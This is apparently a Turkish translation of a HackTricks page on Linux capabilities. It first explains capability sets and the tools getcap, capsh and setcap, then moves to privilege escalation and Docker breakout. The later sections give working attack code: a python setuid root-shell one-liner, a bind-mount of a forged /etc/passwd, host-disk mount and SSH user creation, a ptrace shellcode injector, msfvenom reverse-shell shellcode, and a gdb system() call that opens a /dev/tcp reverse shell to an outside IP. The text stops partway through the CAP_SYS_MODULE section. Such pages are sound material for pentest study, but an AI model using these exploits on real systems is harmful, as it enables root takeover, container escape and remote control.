# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities, **root ayrıcalıklarını daha küçük ve bağımsız birimlere böler** ve süreçlerin ayrıcalıkların yalnızca bir alt kümesine sahip olmasına olanak tanır. Bu, gereksiz yere tam root ayrıcalıkları vermeyerek riskleri en aza indirir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Sorun:

- Normal kullanıcıların raw socket açmak veya 1024'ün altındaki Internet portlarına bağlanmak gibi işlemler için izinleri sınırlıdır; capabilities, tam root ayrıcalığı yerine yalnızca gereken işlemi sağlayabilir.<sup>[[14]](#references)</sup>

### Capability Setleri:

Linux, bu capability setlerini her thread için sunar ve kernel, bir süreç kimlik bilgilerini değiştirdiğinde veya bir dosyayı çalıştırdığında bunların kısıtlamalarını uygular.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Amaç**: Çalıştırılan dosya eşleşen inheritable file capabilities içerdiğinde, `execve()` sonrasında permitted sete katkıda bulunabilecek capabilities'leri tanımlar.
- **İşlev**: Thread'in inheritable seti `execve()` boyunca korunur; tek başına bu capabilities'leri effective hale getirmez.
- **Kısıtlamalar**: Bu sete bir capability eklemek, permitted ve bounding setleri tarafından kısıtlanır.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Amaç**: Bir sürecin herhangi bir anda gerçekten kullandığı capabilities'leri temsil eder.
- **İşlev**: Çeşitli işlemler için izin verilip verilmeyeceğini belirlemek üzere kernel tarafından kontrol edilen capabilities setidir. Dosyalar için bu set, dosyanın permitted capabilities'lerinin effective olarak kabul edilip edilmeyeceğini belirten bir flag olabilir.
- **Önemi**: Effective set, bir sürecin kullanabileceği aktif capabilities seti olarak anlık ayrıcalık kontrolleri açısından kritik öneme sahiptir.

3. **Permitted (CapPrm)**:

- **Amaç**: Bir sürecin sahip olabileceği maksimum capabilities setini tanımlar.
- **İşlev**: Bir süreç, bir capability'yi permitted setinden effective setine yükselterek bu capability'yi kullanabilir. Ayrıca permitted setindeki capabilities'leri bırakabilir.
- **Sınır**: Bir capability bu setten bırakılırsa, onu sağlayan bir dosya çalıştırılmadan veya başka bir ayrıcalıklı geçiş gerçekleşmeden normalde geri yüklenemez.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Amaç**: Bir sürecin `execve()` sırasında bir dosyadan kazanabileceği ve inheritable setine ekleyebileceği capabilities'leri sınırlar.
- **İşlev**: Bu set `fork()` boyunca miras alınır ve `execve()` boyunca korunur; çağıran süreçte `CAP_SETPCAP` varsa capabilities'ler bu setten bırakılabilir.
- **Kullanım alanı**: Gereksiz capabilities'leri bu setten kaldırmak, daha sonra ayrıcalık edinimini sınırlar.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Amaç**: Seçili capabilities'lerin ayrıcalıksız bir programın `execve()` işlemi boyunca permitted ve effective olarak kalmasını sağlar.
- **İşlev**: Çalıştırılan dosya ayrıcalıklı değilse ambient capabilities yeni permitted ve effective setlerine eklenir.
- **Kısıtlamalar**: Bir capability, yalnızca hem permitted hem de inheritable setlerinde mevcut olduğu sürece ambient olabilir; set-user-ID/set-group-ID dosyası veya capabilities içeren bir dosya çalıştırmak ambient setini temizler.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Processes & Binaries Capabilities

### Processes Capabilities

Belirli bir sürecin capabilities'lerini görmek için /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığından, bunu yalnızca Linux capabilities ile ilgili bilgilerle sınırlayalım.\
Çalışan tüm süreçler için capability bilgilerinin thread başına tutulduğunu, file capabilities bilgilerinin ise `security.capability` extended attributes içinde saklandığını unutmayın.<sup>[[14]](#references)[[15]](#references)</sup>

Capabilities tanımlarını /usr/include/linux/capability.h içinde bulabilirsiniz.

Mevcut sürecin capabilities'lerini `cat /proc/self/status` veya `capsh --print` ile, diğer süreçlerinkileri ise `/proc/<pid>/status` içinde görebilirsiniz.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Bu komut, çoğu sistemde beş capability satırı döndürmelidir.<sup>[[15]](#references)</sup>

- CapInh = Devralınan capability'ler
- CapPrm = İzin verilen capability'ler
- CapEff = Etkin capability'ler
- CapBnd = Sınırlandırma kümesi
- CapAmb = Ambient capability kümesi
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Bu onaltılık sayılar bir anlam ifade etmiyor. `capsh` yardımcı programını kullanarak bunları capability adlarına çözümleyebiliriz.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Şimdi `ping` tarafından kullanılan **capabilities**'leri kontrol edelim:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Bu çalışsa da başka ve daha kolay bir yol vardır. Çalışan bir process'in capabilities değerlerini görmek için **getpcaps** aracını process ID'siyle (PID) birlikte kullanın; bu araç ayrıca bir process ID listesi de kabul eder.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
`cap_net_admin` ve `cap_net_raw` yeteneklerini binary'ye verdikten sonra ağı sniff etmek için `tcpdump`'ın yeteneklerini kontrol edelim (`tcpdump`, 9562 numaralı process olarak çalışıyor).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Gördüğünüz gibi, capabilities iki farklı process inceleme yönteminin sonuçlarıyla örtüşür. `getpcaps` aracı, hedef process'in capabilities değerlerini sorgulamak için libcap kullanır ve bunları metin biçiminde yazdırır; bir veya daha fazla PID kabul eder.<sup>[[22]](#references)</sup>

### Binary Yetenekleri

Binary'ler, execution sırasında uygulanan file capabilities değerlerine sahip olabilir. Örneğin bir `ping` binary'si `cap_net_raw` capability'sini taşıyabilir.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
`getcap -r` kullanarak **capabilities içeren binary'leri arayabilirsiniz**.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### capsh ile capabilities bırakma

Etkin bounding set'ten `CAP_NET_RAW` değerini kaldırırsak, bu capability'ye ihtiyaç duyan bir program artık onu kullanamamalıdır.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ çıktısının yanı sıra, _tcpdump_ komutunun kendisi de bir hata vermelidir.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Bu hata, `CAP_NET_RAW` bounding set'ten kaldırıldıktan sonra `tcpdump` komutunun istenen file capability ile çalıştırılamadığını gösterir.

### Capabilities Kaldırma

Bir dosyanın capabilities değerlerini `setcap -r` ile kaldırabilirsiniz.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux, dosya yeteneklerini doğrudan bir oturum açma kullanıcısına atamaz; ancak `pam_cap` PAM modülü, `/etc/security/capability.conf` kullanarak kimliği doğrulanmış oturumlar için devralınabilir yetenekleri ayarlayabilir.<sup>[[16]](#references)</sup> Her giriş, virgülle ayrılmış yetenek adlarını veya numaralarını bir ya da daha fazla kullanıcı adıyla eşleştirir.<sup>[[17]](#references)</sup>
Dosya örneği:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Ortam Yetenekleri

Aşağıdaki programı derlemek, **yetenekler sağlayan bir ortam içinde bir bash shell spawn etmeyi** mümkün kılar.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Derlenen ambient binary tarafından çalıştırılan **bash** içinde, **new capabilities** gözlemlenebilir (normal bir kullanıcı "current" bölümünde herhangi bir capability'ye sahip olmayacaktır).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **Yalnızca hem permitted hem de inheritable kümelerinde bulunan capability'leri ekleyebilirsiniz.**<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binary'ler

Capability-dumb binary, bunları yönetmek için libcap kullanmayan file capabilities'a sahip bir programdır. File effective biti ayarlanmışsa kernel, file'ın permitted capabilities'larını process'in effective kümesine etkinleştirir; process tüm permitted capabilities'ları edinmediyse yürütme başarısız olabilir.<sup>[[14]](#references)</sup>

## Service Capabilities

Root olarak çalışan bir system service, yürütme ortamı capabilities'larını kısıtlamadığı sürece geniş capabilities'ları koruyabilir. Bir systemd unit'inde `User=`, service kullanıcısını seçer ve `AmbientCapabilities=`, yürütülen process'in ambient kümesine adlandırılmış capabilities'ları ekler.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Container'larında Capabilities

Docker, container'ları `--cap-add` ve `--cap-drop` ile değiştirilebilen varsayılan bir capability setiyle başlatır; örnek bir container `amicontained` ile incelenebilir.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities, **privileged işlemleri gerçekleştirdikten sonra kendi process'lerinizi kısıtlamak istediğinizde** (ör. chroot ayarlayıp bir socket'e bağlandıktan sonra) kullanışlıdır. Ancak bunlar, root olarak çalıştırılan kötü amaçlı komutlar veya argümanlar geçirilerek istismar edilebilir.<sup>[[2]](#references)</sup>

`setcap` ile programlara zorla file capabilities atayabilir ve bunları `getcap` ile sorgulayabilirsiniz.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Dosya capability metni için `+ep`, belirtilen capability'yi effective ve permitted kümelerinde yükseltir; `-`, seçilen flag'leri düşürür.<sup>[[21]](#references)</sup>

Bir sistemde veya klasörde capability'lere sahip programları belirlemek için `getcap -r` kullanın.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

Aşağıdaki örnekte `/usr/bin/python2.6` binary'sinin privesc açısından vulnerable olduğu görülmektedir:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` için **herhangi bir kullanıcının paketleri sniff etmesine izin vermek** üzere gereken **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities için özel durum

Bir dosya boş bir capability set taşıyabilir (`getcap myelf`, `myelf =ep` döndürür). Boş bir set hiçbir capability vermez; root-owned bir set-user-ID bitiyle birleştirildiğinde program, file capabilities kazanmadan çalıştırılan process'in effective ve saved ID değerlerini yine de 0 olarak değiştirebilir. Sahipsiz, SUID/SGID olmayan ve `=ep` değerine sahip bir dosya root olarak çalışmaz.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, cihazları mount etmek veya kernel özelliklerini değiştirmek gibi kapsamlı **administrative privileges** sağladığı için neredeyse root seviyesine eşdeğer kabul edilen, son derece güçlü bir Linux capability'sidir. Tüm sistemleri simüle eden container'lar için vazgeçilmez olsa da **`CAP_SYS_ADMIN` önemli security challenges oluşturur**; özellikle privilege escalation ve system compromise potansiyeli nedeniyle containerized ortamlarda risklidir. Bu nedenle kullanımı sıkı security assessments ve dikkatli management gerektirir; **principle of least privilege** ilkesine uymak ve attack surface'i en aza indirmek için application-specific container'larda bu capability'nin kaldırılması güçlü şekilde tercih edilir.<sup>[[14]](#references)</sup>

**binary ile örnek**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python kullanarak değiştirilmiş bir _passwd_ dosyasını gerçek _passwd_ dosyasının üzerine mount edebilirsiniz:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Ve son olarak **mount** edilmiş `passwd` dosyasını `/etc/passwd` üzerine bağlayın:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Ve "password" parolasını kullanarak root olarak **`su`** yapabileceksiniz.

**Environment ile örnek (Docker breakout)**

Docker container içindeki etkin capabilities değerlerini şu komutu kullanarak kontrol edebilirsiniz:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda SYS_ADMIN capability'sinin etkin olduğu görülebilir.<sup>[[14]](#references)</sup>

- **Mount**

Uygun device ve namespace erişimiyle bu, bir Docker container'ının **host diskini mount etmesine ve içeriğine erişmesine** olanak sağlayabilir.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Tam erişim**

Önceki yöntemde bir host diskine erişmeyi başardık.\
Host bir **ssh** server çalıştırıyorsa, **mounted disk** içinde bir user **create** edebilir ve SSH üzerinden erişebilirsiniz.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` ile bir işlem, kendi PID namespace'inde görünür olan diğer işlemleri trace edebilir ve inceleyebilir. Bir Docker container içinden host işlemlerini hedeflemek için `--pid=host` ile host PID namespace'ini paylaşın (veya hedefi içeren bir namespace'e katılın).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` tarafından sağlanan debugging ve system call tracing işlevleri ile `process_vm_readv(2)` ve `process_vm_writev(2)` gibi cross-memory attach çağrılarını kullanma yetkisi verir. Diagnostic ve monitoring amaçları için güçlü olsa da `CAP_SYS_PTRACE`, `ptrace(2)` üzerinde seccomp filter gibi kısıtlayıcı önlemler olmadan etkinleştirildiğinde sistem güvenliğini ciddi ölçüde zayıflatabilir. Özellikle, [bunun gibi proof of concept (PoC) örneklerinde](https://gist.github.com/thejh/8346f47e359adecd1d53) gösterildiği üzere, seccomp tarafından uygulananlar başta olmak üzere diğer güvenlik kısıtlamalarını aşmak için kullanılabilir.<sup>[[10]](#references)</sup>

**Binary ile örnek (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Binary ile örnek (gdb)**

`ptrace` yeteneğine sahip `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
gdb aracılığıyla belleğe enjekte etmek için msfvenom ile bir shellcode oluşturun
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Bir root işlemini gdb ile debug edin ve daha önce oluşturulan gdb satırlarını kopyalayıp yapıştırın:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Ortam ile örnek (Docker breakout) - Başka bir gdb Abuse**

**GDB** yüklüyse (veya örneğin `apk add gdb` ya da `apt install gdb` ile yükleyebiliyorsanız), **host üzerinden bir process'i debug edebilir** ve `system` function'ını çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` capability'sini gerektirir)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Komutun çıktısını göremeyeceksiniz, ancak komut o işlem tarafından çalıştırılacaktır (bu nedenle bir rev shell alın).

> [!WARNING]
> "No symbol "system" in current context." hatasını alırsanız, bir programda gdb aracılığıyla shellcode yüklemeyi gösteren önceki örneği kontrol edin.

**Environment ile örnek (Docker breakout) - Shellcode Injection**

Docker container içinde etkinleştirilmiş capabilities'leri şu komutu kullanarak kontrol edebilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**host** üzerinde çalışan **process**'leri listele: `ps -eaf`

1. **Mimariyi** al: `uname -m`
2. Mimari için bir **shellcode** bul ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **Shellcode**'u bir process belleğine **inject** etmek için bir **program** bul ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. Program içindeki **shellcode**'u **değiştir** ve derle: `gcc inject.c -o inject`
5. **Inject** et ve **shell**'ini al: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir process'in **kernel modüllerini yüklemesine ve kaldırmasına (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` system call'ları)** olanak tanıyarak kernel'in temel işlemlerine doğrudan erişim sağlar. Bir modülün yüklenmesi kernel davranışını değiştirebileceği ve izolasyon sınırlarını aşabileceği için bu capability ciddi güvenlik riskleri oluşturur.<sup>[[6]](#references)[[14]](#references)</sup>
**Bu, process tarafından görülebilen kernel'e modül eklenmesine veya kernel'den modül kaldırılmasına olanak tanır; bir container'da bunun host kernel'i olup olmadığı izolasyon yapılandırmasına bağlıdır**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Aşağıdaki örnekte **`python`** binary'si bu capability'ye sahiptir.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Varsayılan olarak **`modprobe`** komutu, bağımlılık listesi ve eşleme dosyalarını **`/lib/modules/$(uname -r)`** dizininde arar.\
